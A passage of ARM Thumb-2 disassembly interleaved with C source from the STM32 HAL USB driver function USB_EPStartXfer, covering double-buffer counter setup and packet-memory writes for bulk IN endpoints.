 8006fba:	681b      	ldr	r3, [r3, #0]
 8006fbc:	785b      	ldrb	r3, [r3, #1]
 8006fbe:	2b00      	cmp	r3, #0
 8006fc0:	d177      	bne.n	80070b2 <USB_EPStartXfer+0x4c4>
 8006fc2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fc6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fca:	681b      	ldr	r3, [r3, #0]
 8006fcc:	61bb      	str	r3, [r7, #24]
 8006fce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fd2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fd6:	681b      	ldr	r3, [r3, #0]
 8006fd8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006fdc:	b29b      	uxth	r3, r3
 8006fde:	461a      	mov	r2, r3
 8006fe0:	69bb      	ldr	r3, [r7, #24]
 8006fe2:	4413      	add	r3, r2
 8006fe4:	61bb      	str	r3, [r7, #24]
 8006fe6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fee:	681b      	ldr	r3, [r3, #0]
 8006ff0:	781b      	ldrb	r3, [r3, #0]
 8006ff2:	00da      	lsls	r2, r3, #3
 8006ff4:	69bb      	ldr	r3, [r7, #24]
 8006ff6:	4413      	add	r3, r2
 8006ff8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006ffc:	617b      	str	r3, [r7, #20]
 8006ffe:	697b      	ldr	r3, [r7, #20]
 8007000:	881b      	ldrh	r3, [r3, #0]
 8007002:	b29b      	uxth	r3, r3
 8007004:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007008:	b29a      	uxth	r2, r3
 800700a:	697b      	ldr	r3, [r7, #20]
 800700c:	801a      	strh	r2, [r3, #0]
 800700e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007012:	2b3e      	cmp	r3, #62	; 0x3e
 8007014:	d921      	bls.n	800705a <USB_EPStartXfer+0x46c>
 8007016:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800701a:	095b      	lsrs	r3, r3, #5
 800701c:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007020:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007024:	f003 031f 	and.w	r3, r3, #31
 8007028:	2b00      	cmp	r3, #0
 800702a:	d104      	bne.n	8007036 <USB_EPStartXfer+0x448>
 800702c:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007030:	3b01      	subs	r3, #1
 8007032:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007036:	697b      	ldr	r3, [r7, #20]
 8007038:	881b      	ldrh	r3, [r3, #0]
 800703a:	b29a      	uxth	r2, r3
 800703c:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007040:	b29b      	uxth	r3, r3
 8007042:	029b      	lsls	r3, r3, #10
 8007044:	b29b      	uxth	r3, r3
 8007046:	4313      	orrs	r3, r2
 8007048:	b29b      	uxth	r3, r3
 800704a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800704e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007052:	b29a      	uxth	r2, r3
 8007054:	697b      	ldr	r3, [r7, #20]
 8007056:	801a      	strh	r2, [r3, #0]
 8007058:	e056      	b.n	8007108 <USB_EPStartXfer+0x51a>
 800705a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800705e:	2b00      	cmp	r3, #0
 8007060:	d10a      	bne.n	8007078 <USB_EPStartXfer+0x48a>
 8007062:	697b      	ldr	r3, [r7, #20]
 8007064:	881b      	ldrh	r3, [r3, #0]
 8007066:	b29b      	uxth	r3, r3
 8007068:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800706c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007070:	b29a      	uxth	r2, r3
 8007072:	697b      	ldr	r3, [r7, #20]
 8007074:	801a      	strh	r2, [r3, #0]
 8007076:	e047      	b.n	8007108 <USB_EPStartXfer+0x51a>
 8007078:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800707c:	085b      	lsrs	r3, r3, #1
 800707e:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007082:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007086:	f003 0301 	and.w	r3, r3, #1
 800708a:	2b00      	cmp	r3, #0
 800708c:	d004      	beq.n	8007098 <USB_EPStartXfer+0x4aa>
 800708e:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007092:	3301      	adds	r3, #1
 8007094:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007098:	697b      	ldr	r3, [r7, #20]
 800709a:	881b      	ldrh	r3, [r3, #0]
 800709c:	b29a      	uxth	r2, r3
 800709e:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 80070a2:	b29b      	uxth	r3, r3
 80070a4:	029b      	lsls	r3, r3, #10
 80070a6:	b29b      	uxth	r3, r3
 80070a8:	4313      	orrs	r3, r2
 80070aa:	b29a      	uxth	r2, r3
 80070ac:	697b      	ldr	r3, [r7, #20]
 80070ae:	801a      	strh	r2, [r3, #0]
 80070b0:	e02a      	b.n	8007108 <USB_EPStartXfer+0x51a>
 80070b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070ba:	681b      	ldr	r3, [r3, #0]
 80070bc:	785b      	ldrb	r3, [r3, #1]
 80070be:	2b01      	cmp	r3, #1
 80070c0:	d122      	bne.n	8007108 <USB_EPStartXfer+0x51a>
 80070c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070c6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070ca:	681b      	ldr	r3, [r3, #0]
 80070cc:	623b      	str	r3, [r7, #32]
 80070ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070d2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070d6:	681b      	ldr	r3, [r3, #0]
 80070d8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80070dc:	b29b      	uxth	r3, r3
 80070de:	461a      	mov	r2, r3
 80070e0:	6a3b      	ldr	r3, [r7, #32]
 80070e2:	4413      	add	r3, r2
 80070e4:	623b      	str	r3, [r7, #32]
 80070e6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070ee:	681b      	ldr	r3, [r3, #0]
 80070f0:	781b      	ldrb	r3, [r3, #0]
 80070f2:	00da      	lsls	r2, r3, #3
 80070f4:	6a3b      	ldr	r3, [r7, #32]
 80070f6:	4413      	add	r3, r2
 80070f8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80070fc:	61fb      	str	r3, [r7, #28]
 80070fe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007102:	b29a      	uxth	r2, r3
 8007104:	69fb      	ldr	r3, [r7, #28]
 8007106:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8007108:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800710c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007110:	681b      	ldr	r3, [r3, #0]
 8007112:	891b      	ldrh	r3, [r3, #8]
 8007114:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007118:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800711c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007120:	681b      	ldr	r3, [r3, #0]
 8007122:	6959      	ldr	r1, [r3, #20]
 8007124:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007128:	b29b      	uxth	r3, r3
 800712a:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800712e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007132:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007136:	6800      	ldr	r0, [r0, #0]
 8007138:	f001 fa65 	bl	8008606 <USB_WritePMA>
 800713c:	e3ee      	b.n	800791c <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 800713e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007142:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007146:	681b      	ldr	r3, [r3, #0]
 8007148:	785b      	ldrb	r3, [r3, #1]
 800714a:	2b00      	cmp	r3, #0
 800714c:	d177      	bne.n	800723e <USB_EPStartXfer+0x650>
 800714e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007152:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007156:	681b      	ldr	r3, [r3, #0]
 8007158:	64bb      	str	r3, [r7, #72]	; 0x48
 800715a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800715e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007162:	681b      	ldr	r3, [r3, #0]
 8007164:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007168:	b29b      	uxth	r3, r3
 800716a:	461a      	mov	r2, r3
 800716c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800716e:	4413      	add	r3, r2
 8007170:	64bb      	str	r3, [r7, #72]	; 0x48
 8007172:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007176:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800717a:	681b      	ldr	r3, [r3, #0]
 800717c:	781b      	ldrb	r3, [r3, #0]
 800717e:	00da      	lsls	r2, r3, #3
 8007180:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8007182:	4413      	add	r3, r2
 8007184:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007188:	647b      	str	r3, [r7, #68]	; 0x44
 800718a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800718c:	881b      	ldrh	r3, [r3, #0]
 800718e:	b29b      	uxth	r3, r3
 8007190:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007194:	b29a      	uxth	r2, r3
 8007196:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007198:	801a      	strh	r2, [r3, #0]
 800719a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800719e:	2b3e      	cmp	r3, #62	; 0x3e
 80071a0:	d921      	bls.n	80071e6 <USB_EPStartXfer+0x5f8>
 80071a2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071a6:	095b      	lsrs	r3, r3, #5
 80071a8:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80071ac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071b0:	f003 031f 	and.w	r3, r3, #31
 80071b4:	2b00      	cmp	r3, #0
 80071b6:	d104      	bne.n	80071c2 <USB_EPStartXfer+0x5d4>
 80071b8:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80071bc:	3b01      	subs	r3, #1
 80071be:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80071c2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071c4:	881b      	ldrh	r3, [r3, #0]
 80071c6:	b29a      	uxth	r2, r3
 80071c8:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80071cc:	b29b      	uxth	r3, r3
 80071ce:	029b      	lsls	r3, r3, #10
 80071d0:	b29b      	uxth	r3, r3
 80071d2:	4313      	orrs	r3, r2
 80071d4:	b29b      	uxth	r3, r3
 80071d6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80071da:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80071de:	b29a      	uxth	r2, r3
 80071e0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071e2:	801a      	strh	r2, [r3, #0]
 80071e4:	e056      	b.n	8007294 <USB_EPStartXfer+0x6a6>
 80071e6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ea:	2b00      	cmp	r3, #0
 80071ec:	d10a      	bne.n	8007204 <USB_EPStartXfer+0x616>
 80071ee:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071f0:	881b      	ldrh	r3, [r3, #0]
 80071f2:	b29b      	uxth	r3, r3
 80071f4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80071f8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80071fc:	b29a      	uxth	r2, r3
 80071fe:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007200:	801a      	strh	r2, [r3, #0]
 8007202:	e047      	b.n	8007294 <USB_EPStartXfer+0x6a6>
 8007204:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007208:	085b      	lsrs	r3, r3, #1
 800720a:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800720e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007212:	f003 0301 	and.w	r3, r3, #1
 8007216:	2b00      	cmp	r3, #0
 8007218:	d004      	beq.n	8007224 <USB_EPStartXfer+0x636>
 800721a:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800721e:	3301      	adds	r3, #1
 8007220:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007224:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007226:	881b      	ldrh	r3, [r3, #0]
 8007228:	b29a      	uxth	r2, r3
 800722a:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800722e:	b29b      	uxth	r3, r3
 8007230:	029b      	lsls	r3, r3, #10
 8007232:	b29b      	uxth	r3, r3
 8007234:	4313      	orrs	r3, r2
 8007236:	b29a      	uxth	r2, r3
 8007238:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800723a:	801a      	strh	r2, [r3, #0]
 800723c:	e02a      	b.n	8007294 <USB_EPStartXfer+0x6a6>
 800723e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007242:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007246:	681b      	ldr	r3, [r3, #0]
 8007248:	785b      	ldrb	r3, [r3, #1]
 800724a:	2b01      	cmp	r3, #1
 800724c:	d122      	bne.n	8007294 <USB_EPStartXfer+0x6a6>
 800724e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007252:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007256:	681b      	ldr	r3, [r3, #0]
 8007258:	653b      	str	r3, [r7, #80]	; 0x50
 800725a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800725e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007262:	681b      	ldr	r3, [r3, #0]
 8007264:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007268:	b29b      	uxth	r3, r3
 800726a:	461a      	mov	r2, r3
 800726c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800726e:	4413      	add	r3, r2
 8007270:	653b      	str	r3, [r7, #80]	; 0x50
 8007272:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007276:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800727a:	681b      	ldr	r3, [r3, #0]
 800727c:	781b      	ldrb	r3, [r3, #0]
 800727e:	00da      	lsls	r2, r3, #3
 8007280:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8007282:	4413      	add	r3, r2
 8007284:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007288:	64fb      	str	r3, [r7, #76]	; 0x4c
 800728a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800728e:	b29a      	uxth	r2, r3
 8007290:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8007292:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8007294:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007298:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800729c:	681b      	ldr	r3, [r3, #0]
 800729e:	891b      	ldrh	r3, [r3, #8]
 80072a0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80072a4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072a8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ac:	681b      	ldr	r3, [r3, #0]
 80072ae:	6959      	ldr	r1, [r3, #20]
 80072b0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072b4:	b29b      	uxth	r3, r3
 80072b6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80072ba:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80072be:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80072c2:	6800      	ldr	r0, [r0, #0]
 80072c4:	f001 f99f 	bl	8008606 <USB_WritePMA>
            ep->xfer_buff += len;
 80072c8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072cc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072d0:	681b      	ldr	r3, [r3, #0]
 80072d2:	695a      	ldr	r2, [r3, #20]
 80072d4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072d8:	441a      	add	r2, r3
 80072da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072e2:	681b      	ldr	r3, [r3, #0]
 80072e4:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 80072e6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072ea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ee:	681b      	ldr	r3, [r3, #0]
 80072f0:	6a1a      	ldr	r2, [r3, #32]
 80072f2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072f6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072fa:	681b      	ldr	r3, [r3, #0]
 80072fc:	691b      	ldr	r3, [r3, #16]
 80072fe:	429a      	cmp	r2, r3
 8007300:	d90f      	bls.n	8007322 <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 8007302:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007306:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800730a:	681b      	ldr	r3, [r3, #0]
 800730c:	6a1a      	ldr	r2, [r3, #32]
 800730e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007312:	1ad2      	subs	r2, r2, r3
 8007314:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007318:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800731c:	681b      	ldr	r3, [r3, #0]
 800731e:	621a      	str	r2, [r3, #32]
 8007320:	e00e      	b.n	8007340 <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 8007322:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007326:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800732a:	681b      	ldr	r3, [r3, #0]
 800732c:	6a1b      	ldr	r3, [r3, #32]
 800732e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8007332:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007336:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800733a:	681b      	ldr	r3, [r3, #0]
 800733c:	2200      	movs	r2, #0
 800733e:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007340:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007344:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007348:	681b      	ldr	r3, [r3, #0]
 800734a:	643b      	str	r3, [r7, #64]	; 0x40
 800734c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007350:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007354:	681b      	ldr	r3, [r3, #0]
 8007356:	785b      	ldrb	r3, [r3, #1]
 8007358:	2b00      	cmp	r3, #0
 800735a:	d177      	bne.n	800744c <USB_EPStartXfer+0x85e>
 800735c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007360:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007364:	681b      	ldr	r3, [r3, #0]
 8007366:	63bb      	str	r3, [r7, #56]	; 0x38
 8007368:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800736c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007370:	681b      	ldr	r3, [r3, #0]
 8007372:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007376:	b29b      	uxth	r3, r3
 8007378:	461a      	mov	r2, r3
 800737a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800737c:	4413      	add	r3, r2
 800737e:	63bb      	str	r3, [r7, #56]	; 0x38
 8007380:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007384:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007388:	681b      	ldr	r3, [r3, #0]
 800738a:	781b      	ldrb	r3, [r3, #0]
 800738c:	00da      	lsls	r2, r3, #3
 800738e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007390:	4413      	add	r3, r2
 8007392:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007396:	637b      	str	r3, [r7, #52]	; 0x34
 8007398:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800739a:	881b      	ldrh	r3, [r3, #0]
 800739c:	b29b      	uxth	r3, r3
 800739e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80073a2:	b29a      	uxth	r2, r3
 80073a4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073a6:	801a      	strh	r2, [r3, #0]
 80073a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073ac:	2b3e      	cmp	r3, #62	; 0x3e
 80073ae:	d921      	bls.n	80073f4 <USB_EPStartXfer+0x806>
 80073b0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073b4:	095b      	lsrs	r3, r3, #5
 80073b6:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80073ba:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073be:	f003 031f 	and.w	r3, r3, #31
 80073c2:	2b00      	cmp	r3, #0
 80073c4:	d104      	bne.n	80073d0 <USB_EPStartXfer+0x7e2>
 80073c6:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80073ca:	3b01      	subs	r3, #1
 80073cc:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80073d0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073d2:	881b      	ldrh	r3, [r3, #0]
 80073d4:	b29a      	uxth	r2, r3
 80073d6:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80073da:	b29b      	uxth	r3, r3
 80073dc:	029b      	lsls	r3, r3, #10
 80073de:	b29b      	uxth	r3, r3
 80073e0:	4313      	orrs	r3, r2
 80073e2:	b29b      	uxth	r3, r3
 80073e4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80073e8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80073ec:	b29a      	uxth	r2, r3
 80073ee:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073f0:	801a      	strh	r2, [r3, #0]
 80073f2:	e050      	b.n	8007496 <USB_EPStartXfer+0x8a8>
 80073f4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073f8:	2b00      	cmp	r3, #0
 80073fa:	d10a      	bne.n	8007412 <USB_EPStartXfer+0x824>
 80073fc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073fe:	881b      	ldrh	r3, [r3, #0]
 8007400:	b29b      	uxth	r3, r3
 8007402:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007406:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800740a:	b29a      	uxth	r2, r3
 800740c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800740e:	801a      	strh	r2, [r3, #0]
 8007410:	e041      	b.n	8007496 <USB_EPStartXfer+0x8a8>
 8007412:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007416:	085b      	lsrs	r3, r3, #1
 8007418:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800741c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007420:	f003 0301 	and.w	r3, r3, #1
 8007424:	2b00      	cmp	r3, #0
 8007426:	d004      	beq.n	8007432 <USB_EPStartXfer+0x844>
 8007428:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 800742c:	3301      	adds	r3, #1
 800742e:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007432:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007434:	881b      	ldrh	r3, [r3, #0]
 8007436:	b29a      	uxth	r2, r3
 8007438:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 800743c:	b29b      	uxth	r3, r3
 800743e:	029b      	lsls	r3, r3, #10
 8007440:	b29b      	uxth	r3, r3
 8007442:	4313      	orrs	r3, r2
 8007444:	b29a      	uxth	r2, r3
 8007446:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007448:	801a      	strh	r2, [r3, #0]
 800744a:	e024      	b.n	8007496 <USB_EPStartXfer+0x8a8>
 800744c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007450:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007454:	681b      	ldr	r3, [r3, #0]
 8007456:	785b      	ldrb	r3, [r3, #1]
 8007458:	2b01      	cmp	r3, #1
 800745a:	d11c      	bne.n	8007496 <USB_EPStartXfer+0x8a8>
 800745c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007460:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007464:	681b      	ldr	r3, [r3, #0]
 8007466:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800746a:	b29b      	uxth	r3, r3
 800746c:	461a      	mov	r2, r3
 800746e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007470:	4413      	add	r3, r2
 8007472:	643b      	str	r3, [r7, #64]	; 0x40
 8007474:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007478:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800747c:	681b      	ldr	r3, [r3, #0]
 800747e:	781b      	ldrb	r3, [r3, #0]
 8007480:	00da      	lsls	r2, r3, #3
 8007482:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007484:	4413      	add	r3, r2
 8007486:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800748a:	63fb      	str	r3, [r7, #60]	; 0x3c
 800748c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007490:	b29a      	uxth	r2, r3
 8007492:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8007494:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8007496:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800749a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800749e:	681b      	ldr	r3, [r3, #0]
 80074a0:	895b      	ldrh	r3, [r3, #10]
 80074a2:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80074a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074ae:	681b      	ldr	r3, [r3, #0]
 80074b0:	6959      	ldr	r1, [r3, #20]
 80074b2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074b6:	b29b      	uxth	r3, r3
 80074b8:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80074bc:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80074c0:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80074c4:	6800      	ldr	r0, [r0, #0]
 80074c6:	f001 f89e 	bl	8008606 <USB_WritePMA>
 80074ca:	e227      	b.n	800791c <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 80074cc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074d0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074d4:	681b      	ldr	r3, [r3, #0]
 80074d6:	6a1b      	ldr	r3, [r3, #32]
 80074d8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 80074dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074e0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074e4:	681a      	ldr	r2, [r3, #0]
 80074e6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074ea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074ee:	681b      	ldr	r3, [r3, #0]
 80074f0:	781b      	ldrb	r3, [r3, #0]
 80074f2:	009b      	lsls	r3, r3, #2
 80074f4:	4413      	add	r3, r2
